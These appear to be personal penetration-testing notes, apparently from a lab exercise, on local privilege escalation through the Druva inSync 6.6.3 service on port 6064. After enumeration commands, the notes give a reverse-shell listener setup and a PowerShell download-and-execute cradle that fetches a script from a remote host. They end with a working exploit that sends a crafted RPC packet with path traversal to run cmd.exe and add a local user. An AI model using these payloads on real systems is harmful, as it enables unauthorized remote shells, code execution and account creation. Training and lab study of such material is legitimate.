# Enumerating Installed Programs
```powershell
wmic product get name
```

# Enumerating Local Ports
```powershell
netstat -ano | findstr 6064

get-process -Id 3324
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64

get-service | ? {$_.DisplayName -like '*inSync*'}
```

# Automate Services Enumerate
```powershell
Get-NetTCPConnection | ForEach-Object {
    $procName = $null
    # PID vasitəsilə prosesin adını təhlükəsiz şəkildə öyrənirik (bağlanmış proseslərdə xəta verməməsi üçün)
    if ($_.OwningProcess -and (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue)) {
        $procName = (Get-Process -Id $_.OwningProcess).ProcessName
    } else {
        $procName = "Unknown / Closed"
    }

    # Çıxış formatını nizamlayırıq
    [PSCustomObject]@{
        "Local Address"   = "$($_.LocalAddress):$($_.LocalPort)"
        "External Address"  = "$($_.RemoteAddress):$($_.RemotePort)"
        "Status"        = $_.State
        "PID"           = $_.OwningProcess
        "Process Name"    = $procName
    }
} | Out-GridView
```

# Enumerate Service
```powershell
$ServiceName = (Get-Service | Where-Object {$_.DisplayName -like "*inSync*"}).ServiceName
if ($ServiceName) {
    $RegPath = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName").ImagePath
    $CleanPath = $RegPath -replace '"', ''
    if ($CleanPath -match "(.+?\.exe)") { $CleanPath = $Matches[1] }
    Write-Host "[+] Servis Fayl Yolu: $CleanPath" -ForegroundColor Green
    (Get-Item $CleanPath).VersionInfo | Format-List ProductVersion, FileVersion, FileName
} else {
    Write-Host "[-] Servis sistemdə tapılmadı." -ForegroundColor Red
}
```

# Search Service Vulnerabilities 
```powershell
Google Dorking:
Druva inSync 6.6.3 exploit
Druva inSync 6.6.3 vulnerability
```

# Listener
```powershell
Invoke-PowerShellTcp.ps1 faylının sonuna bunu yaz:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.170 -Port 9000

python3 -m http.server 8080

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.15.170:12000/Invoke-PowerShellTcp.ps1')"
```

# Proof of Concept
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
